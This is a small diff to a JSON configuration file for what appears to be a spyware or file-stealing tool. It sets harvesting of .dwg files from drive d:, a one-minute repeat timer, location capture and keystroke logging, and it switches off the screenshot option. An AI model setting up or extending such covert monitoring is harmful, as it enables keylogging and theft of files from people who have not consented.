@@ -14,7 +14,7 @@
   "_allcertainFilesInRootFolder":"d:\\",
   "_certainFileTypeInRootFolder":"dwg",
   "timeRepeatMinutes": 1,
-  "scrShot": true,
+  "_scrShot": true,
   "keyLog": true,
   "_pcCurrentLoc": true,
   "reloadconfigFile": true,
